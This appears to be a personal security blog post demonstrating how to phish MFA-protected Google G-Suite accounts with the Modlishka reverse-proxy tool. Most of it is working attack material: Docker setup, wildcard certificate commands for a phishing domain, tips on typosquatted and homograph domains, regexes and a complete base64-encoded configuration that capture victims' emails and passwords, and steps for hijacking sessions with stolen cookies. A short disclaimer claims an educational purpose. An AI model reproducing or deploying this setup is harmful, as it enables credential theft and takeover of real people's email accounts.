---
layout: post
title:  "[0x5] Phishing MFA accounts"
subtitle: "Modlishka"
date:   2020-07-22 12:00:00
categories: [tools, training]
vimeoId: 440640362
draft: false
author: whois
listImage: "default_post.png"
---

> MFA is usually considered secure. It however can be bypassed by phishing. I made this phishing demo using [drk1wi's](https://github.com/drk1wi) tool [Modlishka](https://github.com/drk1wi/Modlishka). The tool default templates are little bit outdated so here's also instructions how to make it work against G-Suite accounts. This is not a new thing, I just wanted to check if it still works. =)

![Screenshot](/images/blog/legit_site.png)

The full configuration is on [Github](https://github.com/who1s/modlishka-config).

## Demo

{{< vimeo 440640362 >}}

## Put it to the container

I decided to do quick and dirty dockerization for the tool:
```
FROM alpine
FROM golang
RUN go get -u github.com/drk1wi/Modlishka
RUN cd $GOPATH/src/github.com/drk1wi/Modlishka/ && make
COPY modlishka.json /tmp/
```

To build and run the docker container easily, I made a script:
```
#!/bin/bash

docker build -t phishing-demo-mfa .

# Generate few example id's
for i in {1..5}
do
	echo "https://phishing.fi/?id="$i
done

docker run -p80:80 -p443:443 -it --rm phishing-demo-mfa Modlishka -config /tmp/modlishka.json
```

## Generating certificate

To make the phishing site look legit, we need a valid certificate. [Let's Encrypt (LE)](https://letsencrypt.org/) is free to use and trusted certificate provider which supports wildcard certificates. The phishing site could be made more legit by playing around with [IDN](https://en.wikipedia.org/wiki/IDN_homograph_attack), using [typosquatted domain name](https://en.wikipedia.org/wiki/Typosquatting) or simply using subdomains like google.com.phishing.fi.

Let's generate the certificate and follow instructions. Acquiring the certificate requires adding some DNS TXT records to your domain.

```
# apt-get update && apt-get install certbot
# certbot certonly --manual --preferred-challenges dns --manual-public-ip-logging-ok -d '*.phishing.fi' -d phishing.fi
# cp -r /etc/letsencrypt/archive/phishing.fi/ .
```

The Modlishka wants certificate in different format so let's convert it accordingly:
```
# openssl rsa -in privkey1.pem -out priv.key
# sed -i ':a;N;$!ba;s/\n/\\n/g' priv.key
# sed -i ':a;N;$!ba;s/\n/\\n/g' fullchain1.pem
```

## Fixing the configuration

The [Modlishka G-Suite template in Github](https://github.com/drk1wi/Modlishka/blob/master/templates/google.com_gsuite.json) seems to be obsolete. The JSON payload it tries to parse does not include the user name anymore. As the template does not work out of the box, I decided to look into G-Suite authentication process and do modifications accordingly.

Google authentication is doing a POST request where both email address and password are in params.

![Screenshot](/images/blog/phishburp.png)

This is the best place to grab the credentials so we need to adjust Modlishka's credParams configuration to do it:

Username
```
identifierInput=([^\W]+[\.,\-,\_]{0,}\w+[\@,\%40]\w+[\.,\-,\_]{0,}\w+\.\w{2,5})
```

Password
```
password=([a-zA-Z0-9"!"#$%&'()*+,-./:;<=>?@^_{|}~]+)&ca
```

These regex expressions I made with [regex101](https://regex101.com) should grab the email address and the password from given parameters. The Modlishka requires regex in base64 encoded format so the final configuration line would look like this:
```
"credParams": "aWRlbnRpZmllcj0oW15cV10rW1wuLFwtLFxfXXswLH1cdytbXEAsXCU0MF1cdytbXC4sXC0sXF9dXHcrXC5cd3swLDV9KQ==,cGFzc3dvcmQ9KFthLXpBLVowLTkiISIjJCUmJygpKissLS4vOjs8PT4/QF5fe3x9fl0rKSZjYQ==",
```

I also wanted to terminate the connection after the victim has successfully logged in. Reviewing the login process on Google shows the user is being redirected to Mail box after successful login. This means the mailbox URI can be used as a termination string:
```
"terminateTriggers": "/mail/u/",
```

The victim should be redirected to somewhere after the login which could be the real Google mail account for example. For demonstration purposes, we're gonna use this "funny" "hacked" meme:
```
"terminateRedirectUrl": "https://i0.wp.com/nexxytech.com/wp-content/uploads/2016/08/cheers.jpg",
```

The tracking ID should also be adjusted:
```
"trackingParam": "id",
```

The full configuration is here without certificates:
```
# cat modlishka.json
{
  "proxyDomain": "phishing.fi", // Your domain
  "listeningAddress": "0.0.0.0",
  "proxyAddress": "",
  "target": "mail.google.com",
  "targetResources": "content.googleapis.com,www.gstatic.com,ssl.gstatic.com,ogs.google.com,clients1.google.com,clients2.google.com,clients3.google.com,clients4.google.com,clients5.google.com,clients6.google.com",
  "rules": "",
  "terminateTriggers": "/mail/u/",
  "terminateRedirectUrl": "https://i0.wp.com/nexxytech.com/wp-content/uploads/2016/08/cheers.jpg",
  "trackingCookie": "ident",
  "trackingParam": "id",
  "jsRules":"",
  "jsReflectParam": "reflect",
  "debug": false,
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "google.log",
  "plugins": "all",
  "credParams": "aWRlbnRpZmllcj0oW15cV10rW1wuLFwtLFxfXXswLH1cdytbXEAsXCU0MF1cdytbXC4sXC0sXF9dXHcrXC5cd3swLDV9KQ==,cGFzc3dvcmQ9KFthLXpBLVowLTkiISIjJCUmJygpKissLS4vOjs8PT4/QF5fe3x9fl0rKSZjYQ==",
  "cert": "", // fullchain1.pem here
  "certKey": "", // priv.key here
  "certPool": ""
}
```

## Using the stolen credentials

After victim has logged in using the Modlishka proxypage, we can use their cookies to log in by visiting Google's email and setting the gathered cookies for example with Moustachauve's [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) and refreshing the page.

## Resources

- [Modlishka](https://github.com/drk1wi/Modlishka)
- [My configuration](https://github.com/who1s/modlishka-config)

## Disclaimer

This demo is only for demonstration and education purposes. Do not use these instructions to anything illegal.
